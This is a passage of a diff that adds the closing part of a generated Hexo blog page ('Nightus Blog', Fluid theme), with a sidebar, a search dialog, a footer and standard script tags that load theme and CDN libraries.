+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a><span>Nightus Blog</span></a><br/> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
